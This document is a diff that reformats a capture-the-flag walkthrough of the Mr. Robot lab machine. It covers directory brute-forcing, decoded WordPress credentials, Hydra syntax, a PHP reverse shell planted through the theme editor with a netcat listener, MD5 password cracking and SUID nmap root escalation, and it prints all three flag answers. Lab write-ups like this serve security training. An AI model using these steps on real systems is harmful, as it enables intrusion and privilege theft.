@@ -1,77 +1,124 @@
-1. Directory bruteforcing ( Gobuster )
-	<< key 1st >>
-	>> directories.txt -->  ../robots.txt --> ../key-1-of-3.txt --> key"073403c8a58a1f80d943455fb30724b9"
+# **Mr. Robot CTF Walkthrough** 🏴‍☠️  
+🎯 **Completed by: C1ph3r1337**  
 
-2. Cryptography ( CyberChef )
-	>> ../license --> scroll it down to get the key :)
-	>> go to cyberchef and paste "ZWxsaW90OkVSMjgtMDY1Mgo=" to get "elliot:ER28-0652"
+## **1️⃣ Directory Bruteforcing (Gobuster)**  
+🔹 **Key 1st**  
 
-3. Password bruteforcing ( Hydra )
-	>> but I didn't use this :)
-	>> hydra -l <username> -P <password-list> <target-IP> -t <threads> <protocol>
+- Use `directories.txt` for brute-forcing:  
+  ```bash
+  gobuster dir -u http://<target-IP> -w /path/to/directories.txt
+  ```
+- Found `robots.txt` → `key-1-of-3.txt`  
+- **Key 1:** `073403c8a58a1f80d943455fb30724b9`  
 
-	    -l <username> → Specify a single username.
+---
 
-	    -L <username-list> → Use a list of usernames.
+## **2️⃣ Cryptography (CyberChef)**  
+- Found `../license` file → Scroll down to find a key.  
+- Decode using **CyberChef**:  
+  ```
+  ZWxsaW90OkVSMjgtMDY1Mgo=
+  ```
+  ➡️ Decoded: **elliot:ER28-0652**  
 
-	    -p <password> → Try a single password.
+---
 
-	    -P <password-list> → Use a wordlist of passwords.
+## **3️⃣ Password Bruteforcing (Hydra) [Skipped]**  
+🔹 Although I didn’t use Hydra, here’s how it works:  
+```bash
+hydra -l <username> -P <password-list> <target-IP> -t <threads> <protocol>
+```
+- `-l` → Single username  
+- `-L` → List of usernames  
+- `-p` → Single password  
+- `-P` → List of passwords  
+- `-t` → Threads (default 16)  
+- `<protocol>` → Service (e.g., SSH, FTP)  
 
-	    <target-IP> → IP or domain of the target.
+---
 
-	    -t <threads> → Number of threads (default is 16).
-	    
-	    <protocol> → Service to attack (e.g., ssh, ftp, http, etc.).
+## **4️⃣ WordPress Login (Gobuster)**  
+- **Found login page:** `../wp-login.php`  
+- Used credentials:  
+  ```
+  Username: elliot  
+  Password: ER28-0652  
+  ```
 
-4. Login Wordpress ( Gobuster )
-	>> ../wp-login.php --> "username:password" --> "elliot:ER28-0652"
+---
 
-5. Reverse Shell ( PHP rev shell )
-	<< key 2nd >>
-	
-	>> Go to "www.revshells.com" --> PHP PentestMonkey 
-	>> In the code change the ip to tun0 ip ( 10.10.10.10 --> 10.X.X.X ) 
-	>> In the wordpress go to editor and then php add this rev sehll code in that and update it . 
-	>> Open the ../xyz.php 
-	>> Then run netcat --> nc -lvnp "port number"
-	>> run this command to run the terminal --> " python3 -c 'import pty; pty.spawn("/bin/bash")' " 
-	>> cd home --> cd robot --> cat password.raw-md5 --> "c3fcd3d76192e4007dfb496cca67e13b"
-	>> as it is "md5" hashed , so we need to decrypt it 
-	>> "c3fcd3d76192e4007dfb496cca67e13b" --> "abcdefghijklmnopqrstuvwxyz"
-	>> su "username" --> su robot --> password : "abcdefghijklmnopqrstuvwxyz"
-	>> cat key-2-of-3.txt --> "822c73956184f694993bede3eb39f959"
+## **5️⃣ Reverse Shell (PHP rev shell)**  
+🔹 **Key 2nd**  
 
-6. Privilege Escalation ( GTFOBins - nmap shell )
+- Generate a **PHP reverse shell** from [www.revshells.com](https://www.revshells.com/) (PentestMonkey)  
+- Modify the shell:  
+  - Change `10.10.10.10` to **your tun0 IP**  
+- Upload to **WordPress theme editor** and update.  
+- Access shell via browser:  
+  ```
+  http://<target-IP>/xyz.php
+  ```
+- Start Netcat listener:  
+  ```bash
+  nc -lvnp <port>
+  ```
+- Spawn a stable shell:  
+  ```bash
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  ```
+- Extract password:  
+  ```bash
+  cd home/robot  
+  cat password.raw-md5
+  ```
+  ```
+  c3fcd3d76192e4007dfb496cca67e13b  → MD5 hash  
+  ```
+- Decrypt MD5 (`hash: abcdefghijklmnopqrstuvwxyz`)  
+- Switch user:  
+  ```bash
+  su robot  
+  Password: abcdefghijklmnopqrstuvwxyz  
+  ```
+- **Key 2:** `822c73956184f694993bede3eb39f959`  
 
-	What is privilege escalation?
-	Privilege escalation refers to the process in which a user gains higher levels of access or privileges within a computer system,network, or application. To be more specific, it's the exploitation of a vulnerability, design flaw, or configuration 
-	oversight in an operating system or application.
-	
-	<< key 3rd >>
+---
 
-	>> permission denied at "ls /root"  
-	>> find / -perm +6000 2>/dev/null | grep '/bin/'
-	     >> Breaking it Down:
+## **6️⃣ Privilege Escalation (GTFOBins - Nmap Shell)**  
+🔹 **Key 3rd**  
 
-		   1. find / -perm +6000 2>/dev/null
+### **What is Privilege Escalation?**  
+> Privilege escalation exploits vulnerabilities, design flaws, or misconfigurations to gain higher-level access within a system.
 
-			find / → Searches from the root directory (/).
+- **Check for restricted access:**  
+  ```bash
+  ls /root  
+  ```
+  **Permission denied**  
 
-			-perm +6000 → Looks for files with SUID (4000) or SGID (2000) permissions.
+- **Find SUID binaries:**  
+  ```bash
+  find / -perm -6000 2>/dev/null | grep '/bin/'
+  ```
+  **Found:** `/usr/local/bin/nmap`  
 
-			2>/dev/null → Redirects error messages (like "Permission denied") to /dev/null, hiding them.
+- **Exploit using GTFOBins**  
+  - Visit: [gtfobins.github.io](https://gtfobins.github.io)  
+  - Run interactive Nmap shell:  
+    ```bash
+    nmap --interactive  
+    !sh  
+    ```
+  - Verify root access:  
+    ```bash
+    whoami
+    ```
+  - Access final key:  
+    ```bash
+    cd /root  
+    ls  
+    cat key-3-of-3.txt  
+    ```
+  - **Key 3:** `04787ddef27c3dee1ee161b21670b4e4`  
 
-		   2. | grep '/bin/'
-
-			| → Pipes the output of find into grep.
-
-			grep '/bin/' → Filters results to only show files inside /bin/ (or subdirectories).
-	
-	>> .... /usr/local/bin/nmap
-	>> Go to "gtfobins.github.io" --> look for nmap shell and use this --> run "nmap --interactive" then "!sh"
-	>> to check root privilege tun command "whoami"
-	>> cd /root --> ls --> cat key-3-of-3.txt --> "04787ddef27c3dee1ee161b21670b4e4"
-	
-	
-	
+**🔹 Completed by: C1ph3r1337** 🏆
